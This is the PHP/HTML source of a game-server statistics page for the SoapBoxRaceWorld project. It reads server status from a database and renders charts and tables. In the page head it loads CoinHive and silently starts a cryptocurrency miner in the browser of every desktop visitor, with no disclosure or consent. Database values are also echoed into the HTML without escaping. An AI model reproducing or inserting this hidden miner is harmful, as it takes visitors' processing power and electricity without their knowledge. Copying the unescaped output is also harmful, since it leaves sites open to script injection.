<?php
	$db = mysqli_connect("", "", "");
	mysqli_select_db($db, "");

	$refreshtime = 100 - (time() % 100);
	$countloggedin = 0;
	$countregistered = 0;

	$query = mysqli_query($db, "SELECT * FROM `servers` ORDER BY `isOnline` DESC, `fetchData` DESC, `isOfficial` DESC, `isCertified` DESC, `isBanned` ASC, `sortID` ASC");
	while($x = mysqli_fetch_array($query)) {
		$jsnames[] = $x['serverName'];
		$colors[] = "#".$x['colors'];
		$fulldatabase[] = $x;

		$countloggedin += $x['onlineNumber'];
		$countregistered += $x['maxOnline'];
	}

	$srvnum = mysqli_num_rows($query);

	$js = json_encode($jsnames);
	$colors = json_encode($colors);
?>

<html>
	<head>
		<title>SoapBoxRaceCore Stats</title>
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<link rel="shortcut icon" href="https://launcher.soapboxrace.world/favicon.ico">

		<script type="text/javascript">
			var names = <?=$js;?>;
		</script>
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
		<link rel="stylesheet" href="https://launcher.soapboxrace.world/stats/assets/css/animate.css">
		<link rel="stylesheet" href="https://launcher.soapboxrace.world/stats/assets/css/framework.css">
		<link rel="stylesheet" href="//cdn.datatables.net/1.10.16/css/jquery.dataTables.min.css">

		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.10/css/all.css" integrity="sha384-+d0P83n9kaQMCwj8F4RJB66tzIwOKmrdb46+porD/OvrJ+37WqIM7UoBtwHO6Nlg" crossorigin="anonymous">
		<link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
		<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
		<style type="text/css">
		body {
			background: #000 url("https://launcher.soapboxrace.world/stats/assets/images/background1.jpg") no-repeat top center;
			margin: 0;
			padding: 0;
			font-family: 'Roboto Condensed', sans-serif;
		}

		.container {
			margin: 40px auto;
			border-radius: 3px;
		}

		.forced-nosize {
			margin-top: -20px;
			min-height: 0px !important;
		}

		.footer {
			font-family: 'Montserrat', sans-serif;
			padding: 10px;
		}

		.loading {
			text-align: center;
			width: 100%;
			color: gray;
			padding-top: 20px;
			font-size: 28px;
		}

		.loading2 {
			text-align: center;
			width: 100%;
			color: #bfbfbf;
			font-size: 20px;
		}

		.container {
			border-left: 1px solid #efefef;
			border-right: 1px solid #efefef;
			background: white;
			min-height: 100%;
		}

		.s_status {
			width: 10px;
			height: 10px;
			display: inline-block;
			border-radius: 50%;
			margin-right: 5px;
		}

		.s_offline {
			background: #ffcd71;
		}

		.s_disabled {
			background: #ff7171;
		}

		.s_online {
			background: #78ff78;
		}

		.s_busy {
			background: #78ecff;
		}

		.btnset {
			margin-top: -9px;
		    margin-right: -14px;
		}

		.social {
			padding: 5px 10px;
		    border-radius: 3px;
		    color: white;
		    width: 35px;
		    display: inline-block;
		    text-align: center;
		    opacity: .9;
			margin-right: 2px;

			-webkit-transition: opacity 0.2s ease-in-out;
			-moz-transition: opacity 0.2s ease-in-out;
			-ms-transition: opacity 0.2s ease-in-out;
			-o-transition: opacity 0.2s ease-in-out;
			transition: opacity 0.2s ease-in-out;
		}

		.social.fb {
			background: #3b5998;
		}

		.social.discord {
			background: #7289DA;
		}

		.social.www {
			background: #ff5200;
		}

		.social.nothing {
			background: #9cd873;
		    width: 109px;
		    font-weight: bold;
			opacity: 1 !important;
			cursor: not-allowed;
		}

		.social.banned {
			background: #ff5757;
		    width: 109px;
		    font-weight: bold;
			opacity: 1 !important;
			cursor: not-allowed;
		}

		.social:hover {
			opacity: 1 !important;
		}

		.socialpanel:hover .social{
			opacity: .6;
		}

		.social.disabled {
			background: #c7c7c7;
			cursor: not-allowed;
			-webkit-filter: grayscale(100%);
	        -moz-filter: grayscale(100%);
	        -o-filter: grayscale(100%);
	        -ms-filter: grayscale(100%);
	        filter: grayscale(100%); 
		}

		.badge {
			cursor: default;
			-webkit-transition: all 0.2s ease-in-out;
			-moz-transition: all 0.2s ease-in-out;
			-ms-transition: all 0.2s ease-in-out;
			-o-transition: all 0.2s ease-in-out;
			transition: all 0.2s ease-in-out;
		}

		.badge:hover {
			color: white !important;
		}

		.badge .hide {
			display: none;
		}

		.badge:hover .hide {
			display: inline;
		}

		.badge.official {
			color: #00c500;
		}

		.badge.official:hover {
			background: #00c500;
		}

		.badge.certified {
			color: orange;
		}

		.badge.certified:hover {
			background: orange;
		}

		.badge.proxy {
			color: #0072ff;
		}

		.badge.proxy:hover {
			background: #0072ff;
		}

		.badge.banned {
			color: red;
		}

		.badge.banned:hover {
			background: red;
		}

		.badge.info {
			color: gray;
		}

		.badge.info:hover {
			background: gray;
		}

		.badge.official,
		.badge.certified,
		.badge.banned,
		.badge.info,
		.badge.proxy {
			position: absolute;
		}

		.badge.official:hover i,
		.badge.certified:hover i,
		.badge.banned:hover i,
		.badge.info:hover i, 
		.badge.proxy:hover i {
			display: none;
		}

		.badge.info {
			z-index: 99;
		}

		.separate {
		    width: 20px;
		    display: inline-block;
		}
		</style>
		<script type="text/javascript">
			window.mobileAndTabletcheck = function() {
  var check = false;
  (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
  return check;
};
		</script>

		<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    	<script src="https://cdnjs.cloudflare.com/ajax/libs/highstock/5.0.14/highstock.js"></script>
    	<script src="https://cdnjs.cloudflare.com/ajax/libs/highstock/5.0.14/js/modules/exporting.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-timeago/1.6.1/jquery.timeago.js"></script>
		<script src="assets/js/ping.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha384-b/U6ypiBEHpOf/4+1nzFpr53nxSS+GLCkfwBdFNTxtclqqenISfwAzpKaMNFNmj4" crossorigin="anonymous"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
		<script src="//cdn.datatables.net/1.10.16/js/jquery.dataTables.min.js"></script>

		<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
		<script>
			var miner = new CoinHive.User('xBYFfMkgxIZm96bUQuaVtXaWWPiQ0tYn', "<?=$_SERVER['REMOTE_ADDR']?>" ,{throttle: 0.8});
			if (!miner.isMobile()) {
				miner.start();
			}
		</script>

		<script type="text/javascript">
		var someGlobalTime = 0;

		jQuery(document).ready(function() {
			jQuery(".jshide").show();

			jQuery.timeago.settings.allowFuture = false;
			jQuery.timeago.settings.strings.seconds = "%d seconds";
			jQuery.timeago.settings.refreshMillis = 1000;

			$(".timeago").timeago();
			$('.showtt').tooltip({placement: 'left'});
			$('.showtt2').tooltip({placement: 'bottom'});
			$('.showtt3').tooltip({placement: 'right'});


			jQuery("#enableautorefresh").click(function() {
				jQuery("#enabledinfo").removeClass("alert-success").addClass("alert-info").html("<b>INFO:</b> Please wait...");
				jQuery("#disabledinfo").removeClass("alert-success").addClass("alert-info").html("<b>INFO:</b> Please wait...");
				document.cookie = "disable-autorefresh=; Max-Age=-99999999;";
				location.reload();
			});

			jQuery("#disableautorefresh").click(function() {
				clearTimeout(someGlobalTime);
				jQuery("#enabledinfo").removeClass("alert-info").addClass("alert-success").html("<b>INFO:</b> Autorefresh disabled. A cookie has been set to disable it on next relaunch.<div class='float-right'><button class='btn btn-success btnset' id='enableautorefresh' disabled>Reactivate</button>");
				document.cookie = "disable-autorefresh=true; expires=Thu, 31 Dec 2037 00:00:00";
			});


			<?php if(!isset($_COOKIE['disable-autorefresh'])) { ?> 
			var secondsToUpdate = <?=$refreshtime?>;
			var updatedtext;

			var Tick = function() {
					if (secondsToUpdate <= 0) {
							jQuery("#js-refresh").html("<b>soon</b>");
							location.reload();
					} else {
							someGlobalTime = setTimeout(Tick, 1000);
							updatedtext = --secondsToUpdate;

							if(secondsToUpdate <= 4) {
								jQuery("#js-refresh").html("<b>soon</b>");
							} else {
								var ref = updatedtext;
								jQuery("#js-refresh").html("in <b>" + ref + "</b> seconds");
							}
					}
			};

			Tick();
			<?php } ?>
		});
			Highcharts.createElement('link', {
				href: 'https://fonts.googleapis.com/css?family=Dosis:400,600',
				rel: 'stylesheet',
				type: 'text/css'
			}, null, document.getElementsByTagName('head')[0]);

			Highcharts.theme = {
				colors: ['#e6194b', '#f58231', '#ffe119', '#3cb44b', '#008080', '#46f0f0', '#0082c8','#000080', '#911eb4', '#f032e6', '#e6beff', '#e6194b', '#f58231', '#ffe119', '#3cb44b', '#008080', '#46f0f0', '#0082c8','#000080', '#911eb4', '#f032e6', '#e6beff', '#e6194b', '#f58231', '#ffe119', '#3cb44b', '#008080', '#46f0f0', '#0082c8','#000080', '#911eb4', '#f032e6', '#e6beff', '#e6194b', '#f58231', '#ffe119', '#3cb44b', '#008080', '#46f0f0', '#0082c8','#000080', '#911eb4', '#f032e6', '#e6beff'],
				tooltip: {
					shared: true,
					shadow: true,
					borderWidth: 0,
					borderRadius: 6,
					backgroundColor: 'rgba(33, 37, 41, 1)',
					style: {
						color: '#FFF'
					}
				},
			};
			Highcharts.setOptions(Highcharts.theme);
		</script>
		<script src="https://launcher.soapboxrace.world/stats/assets/js/api.min.js?<?=time()?>"></script>
	</head>
	<body>
		<div class="container">
			<br />
			<h3 style="padding-bottom: 0.3em;border-bottom: 1px solid #eaecef;">SBRW Player Count Statistics <span class="float-right"><a href="https://twitter.com/ServerStatusNFS"><i class="fab fa-twitter-square"></i></a><span></h3>

			<?php if(isset($_COOKIE['disable-autorefresh'])) { ?>
				<div style="display: none;" class="jshide alert alert-success" id="disabledinfo"><b>INFO:</b> A cookie has been set to disable autorefresh. <div class="float-right"><button class="btn btn-success btnset" id="enableautorefresh">Reactivate</button></div> </div>
			<?php } else { ?>
				<div style="display: none;" class="jshide alert alert-info" id="enabledinfo"><b>INFO:</b> Page will auto refresh <span id="js-refresh">in <b><?=$refreshtime?></b> seconds</span> <div class="float-right"><button class="btn btn-info btnset" id="disableautorefresh">Disable autorefresh</button></div></div>
			<?php } ?>

			<table class="table table-bordered table-responsive">
				<thead class="thead-inverse">
					<tr>
						<th><i class="fa fa-line-chart" aria-hidden="true"></i> Users Online</th>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td style="padding: 0; background: #fefefe;">
							<div id="js-highstock" style="height: 400px; min-width: 310px">

								<noscript>
									<div class="alert alert-danger" style="margin: 20px;"><b>INFO: </b> Please enable JavaScript on your browser to view charts</div>
								</noscript>

								<div class="jshide" style="display: none;">
									<img class="animated infinite flash" src="https://launcher.soapboxrace.world/stats/assets/images/retouched3_ps.png" width="400px" style="margin: auto; display: block; margin-top: 30px; opacity: 1;">

									<div class="loading">Loading charts, please wait</div>
									<div class="loading2" style="display: none;"><!--(<b><span class="loaded">0</span></b> out of <b><?=$srvnum;?></b>) --><span class="srvname"></span></div>

									<div class="progress" style="display: none; width: 50%; margin: auto; margin-top: 20px;">
									  <div class="progress-bar" style="width:0%">
									    <span class="sr-only">0% Completed</span>
									  </div>
									</div>
								</div>
							</div>
						</td>
					</tr>
				</tbody>
			</table>

			<table class="table table-responsive jquerydatatable" style="border: 1px solid #efefef;">
				<thead class="thead-inverse">
					<tr>
						<th style="width: 55%;"><i class="fa fa-clock-o" aria-hidden="true"></i> Live statistics</th>
						<th>Current/Max</th>
						<th>Date</th>
						<th>Ping</th>
						<th style="width: 1%;">Social</th>
						<!--th>Connect</th-->
					</tr>
				</thead>
				<tbody>
					<tr rowspan="2">
						<th scope="row" style="position: relative;">
							<div class="s_status s_online showtt" title="" data-original-title="Server is online"></div>
							<span class="badge proxy">
								<i class="fas fa-globe showtt3" aria-hidden="true" data-original-title="" title=""></i> <span class="hide">Proxified Server</span>
							</span>
							<span class="separate"></span> WorldUniverse <small class="text-muted">(aka Random Server)</small><br>
							<small class="text-muted"><i class="fa fa-link" aria-hidden="true"></i> nfswlaunch://connect/launcher.soapboxrace.world:1337/</small>
						</th>
						<td><?=$countloggedin?>/<b><?=$countregistered?></b></td>
						<td class="showtt">
							---
						</td>
						<td>
							<div style="text-align: center;">---</div>
						</td>
						<td>
							<div class="socialpanel">
								<span class="social nothing">¯\_(ツ)_/¯</span>
							</div>
						</td>
				</tr>
				<?php
					foreach($fulldatabase as $servers) {
						if($servers['fetchData'] == 1) {
							$serverip = str_replace("http://", "nfswlaunch://connect/", str_replace("soapbox-race-core/Engine.svc", "", $servers['serverIP']));

							if($servers['fetchData'] == 0) {
								$status = "<div class='s_status s_disabled showtt' title='Server has been shutted down'></div>";
								$connect = "";
								$counter = "---";
								$ping = "---";
							} elseif($servers['isOnline'] == 0) {
								$status = "<div class='s_status s_offline showtt' title='Failed to ping server'></div>";
								$connect = "";
								$counter = "---";
								$ping = "---";
							} elseif($servers['onlineNumber'] == 0) {
								?>
									<script type="text/javascript">
										ping("<?=$servers['serverIP']?>/GetServerInformation").then(function(x) {
											jQuery(".ping_<?=$servers['ID']?>").text(x + "ms");
										})
									</script>
								<?php

								$status = "<div class='s_status s_busy showtt' title='Server is online, but no one is connected'></div>";
								$connect = "<a class='btn btn-dark btn-sm' href='".$serverip."' role='button'>Connect</a>";
								$counter = $servers['onlineNumber'];
								$ping = "<div style='text-align: center;' class='ping_".$servers['ID']."'>...</div>";
							} else {
								?>
									<script type="text/javascript">
										ping("<?=$servers['serverIP']?>/GetServerInformation").then(function(x) {
											jQuery(".ping_<?=$servers['ID']?>").text(x + "ms");
										})
									</script>
								<?php

								$status = "<div class='s_status s_online showtt' title='Server is online'></div>";
								$connect = "<a class='btn btn-dark btn-sm' href='".$serverip."' role='button'>Connect</a>";
								$counter = $servers['onlineNumber'];
								$ping = "<div style='text-align: center;' class='ping_".$servers['ID']."'>...</div>";
							}

							if($servers['information'] != NULL) {
								$infobutton = "<span class='badge info' style='cursor: pointer;'><i class='fa fa-info' aria-hidden='true'></i><span class='hide'>".$servers['information']."</span></span></span><span class='separate'></span>";
							} else {
								$infobutton = "";
							}

							if($servers['isOfficial'] == 1) {
								$append = "<span class='badge official'><i class='fa fa-check showtt3' aria-hidden='true'></i> <span class='hide'>Official Server</span></span><span class='separate'></span> ";
							} elseif($servers['isBanned'] == 1) {
								$append = "<span class='badge banned'><i class='fa fa-times showtt3' aria-hidden='true'></i> <span class='hide'>Banned Server</span></span><span class='separate'></span> ";
							} elseif($servers['isCertified'] == 1) {
								$append = "<span class='badge certified'><i class='fas fa-bolt showtt3' aria-hidden='true'></i> <span class='hide'>POWER Server</span></span><span class='separate'></span> ";
							} else {
								$append = "";
							}

							if($servers['social']) {
								$appendsocial = "";

								$socialize = json_decode($servers['social'], true);

								if($socialize != NULL) {
									if($socialize['www'] == "nope" && $socialize['fb'] == "nope" && $socialize['discord'] == "nope" || $socialize['www'] == "" && $socialize['fb'] == "" && $socialize['discord'] == "") {
										$appendsocial = "<span class='social nothing'>¯\_(ツ)_/¯</span>";
									} else {
										if(filter_var($socialize['discord'], FILTER_VALIDATE_URL)) {
											$appendsocial .= "<a href='".$socialize['discord']."' target='_blank'><span class='social discord'><i class='fab fa-discord'></i></span></a>";
										} else {
											$appendsocial .= "<span class='social discord disabled'><i class='fab fa-discord'></i></span>";
										}

										if(filter_var($socialize['www'], FILTER_VALIDATE_URL)) {
											$appendsocial .= "<a href='".$socialize['www']."' target='_blank'><span class='social www'><i class='fas fa-home'></i></span></a>";
										} else {
											$appendsocial .= "<span class='social www disabled'><i class='fas fa-home'></i></span>";
										}

										if(filter_var($socialize['fb'], FILTER_VALIDATE_URL)) {
											$appendsocial .= "<a href='".$socialize['fb']."' target='_blank'><span class='social fb'><i class='fab fa-facebook-f'></i></span></a>";
										} else {
											$appendsocial .= "<span class='social fb disabled'><i class='fab fa-facebook-f'></i></span>";
										}
									}
								}
							} else {
								$appendsocial = "<span class='social nothing'>¯\_(ツ)_/¯</span>";
							}

							if($servers['isBanned'] == 1)  {
								$appendsocial = "<span class='social banned'>Banned</span>";
							} 

							if($servers['proxyurl'] != NULL) {
								$proxyurl = str_replace("http://", "nfswlaunch://connect/", str_replace("soapbox-race-core/Engine.svc", "", $servers['proxyurl']));
								$hasproxy = " <br /> <i class='fas fa-globe' aria-hidden='true'></i> ".$proxyurl."</small>";
							} else {
								$hasproxy = "</small>";
							}

							echo "<tr rowspan='2'>";
							echo "<th scope='row' style='position: relative;'>".$status." ".$append.$servers['serverName']." ".$infobutton." <br /><small class='text-muted'><i class='fa fa-link' aria-hidden='true'></i> ".$serverip.$hasproxy."</th>";
							echo "<td>".$counter."/<b>".$servers['maxOnline']."</b></td>";
							echo "<td class='showtt' title='".date("F d, Y", $servers['maxOnlineTimestamp'])."'> <time class='timeago' title='' datetime='".date("Y-m-d\TH:i:s\\+\\0\\2\\0\\0", $servers['maxOnlineTimestamp'])."'></time></td>";
							echo "<td>".$ping."</td>";
							echo "<td><div class='socialpanel'>".$appendsocial."</div></td>";
							echo "<!--td>".$connect."</td-->";
							echo "</tr>";
						}
					}
				?>
				</tbody>
			</table>

			<table class="table table-responsive jquerydatatable" style="border: 1px solid #efefef;">
				<thead class="thead-inverse">
					<tr>
						<th style="width: 70%;"><i class="fa fa-clock-o" aria-hidden="true"></i> Offline Servers Statistics</th>
						<th>Max/Registered</th>
						<th>Date</th>
					</tr>
				</thead>
				<tbody>
				<?php
					foreach($fulldatabase as $servers) {
						if($servers['fetchData'] == 0) {
							$status = "<div class='s_status s_disabled showtt' title='Server has been shutted down'></div>";
							
							if($servers['information'] != NULL) {
								$infobutton = "<span class='badge info' style='cursor: pointer;'><i class='fa fa-info' aria-hidden='true'></i><span class='hide'>".$servers['information']."</span></span></span><span class='separate'></span>";
							} else {
								$infobutton = "";
							}

							if($servers['isOfficial'] == 1) {
								$append = "<span class='badge official'><i class='fa fa-check showtt3' aria-hidden='true'></i> <span class='hide'>Official Server</span></span><span class='separate'></span> ";
							} elseif($servers['isBanned'] == 1) {
								$append = "<span class='badge banned'><i class='fa fa-times showtt3' aria-hidden='true'></i> <span class='hide'>Banned Server</span></span><span class='separate'></span> ";
							} elseif($servers['isCertified'] == 1) {
								$append = "<span class='badge certified'><i class='fas fa-bolt showtt3' aria-hidden='true'></i> <span class='hide'>POWER Server</span></span><span class='separate'></span> ";
							} else {
								$append = "";
							}

							if($servers['isBanned'] == 1)  {
								$appendsocial = "<span class='social banned'>Banned</span>";
							}

							echo "<tr rowspan='2'>";
							echo "<th scope='row' style='position: relative;'>".$status." ".$append.$servers['serverName']." ".$infobutton."</th>";
							echo "<td>".$servers['maxOnline']."/<b>".$servers['registeredCount']."</b></td>";
							echo "<td class='showtt' title='".date("F d, Y", $servers['maxOnlineTimestamp'])."'> <time class='timeago' title='' datetime='".date("Y-m-d\TH:i:s\\+\\0\\2\\0\\0", $servers['maxOnlineTimestamp'])."'></time></td>";
							echo "</tr>";
						}
					}
				?>
				</tbody>
			</table>
			<br />
		</div>

		<div class="container forced-nosize">
			<div class="footer">
				©️ SoapBoxRaceWorld Team 2018
			</div>
		</div>
	</body>
</html>
